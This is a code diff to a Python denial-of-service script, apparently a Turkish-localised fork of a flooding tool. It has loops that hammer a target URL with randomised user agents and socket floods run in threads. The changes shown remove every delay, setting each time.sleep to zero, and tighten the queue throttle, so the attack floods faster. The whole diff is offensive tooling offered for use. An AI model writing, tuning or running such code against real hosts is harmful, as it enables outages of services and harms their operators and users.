@@ -18,22 +18,14 @@ def user_agent():
 	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
 	return(uagent)
 
-
-def my_bots():
-	global bots
-	bots=[]
-	bots.append()
-	return(bots)
-
-
 def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
 			print("\033[94mbot is hammering...\033[0m")
-			time.sleep(.1)
+			time.sleep(0)
 	except:
-		time.sleep(.1)
+		time.sleep(0)
 
 
 def down_it(item):
@@ -48,11 +40,11 @@ def down_it(item):
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
-			time.sleep(.1)
+			time.sleep(0)
 	except socket.error as e:
 		print("\033[91mno Bağlantı kurulamıyor! \033[0m")
 		print("\033[91m",e,"\033[0m")
-		time.sleep(.1)
+		time.sleep(0)
 
 
 def dos():
@@ -128,8 +120,7 @@ if __name__ == '__main__':
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
 	print("\033[94m Lütfen bekleyiniz...\033[0m")
 	user_agent()
-	my_bots()
-	time.sleep(5)
+	time.sleep(0)
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((host,int(port)))
@@ -149,9 +140,9 @@ if __name__ == '__main__':
 		#tasking
 		item = 0
 		while True:
-			if (item>10): # for no memory crash
+			if (item>1): # for no memory crash
 				item=0
-				time.sleep(.1)
+				time.sleep(0)
 			item = item + 1
 			q.put(item)
 			w.put(item)
